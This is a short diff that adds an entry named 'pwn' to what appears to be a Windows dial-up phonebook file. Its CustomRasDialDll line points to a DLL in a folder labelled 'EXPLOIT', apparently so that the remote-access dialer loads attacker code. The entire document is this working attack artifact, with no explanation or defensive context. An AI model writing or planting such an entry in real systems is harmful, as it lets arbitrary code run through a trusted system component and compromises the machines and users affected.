@@ -1,0 +1,6 @@
+[pwn]
+Encoding=1
+Type=1
+AutoLogon=0
+UseRasCredentials=1
+CustomRasDialDll=C:\Users\Public\Desktop\EXPLOIT\pwn.dll
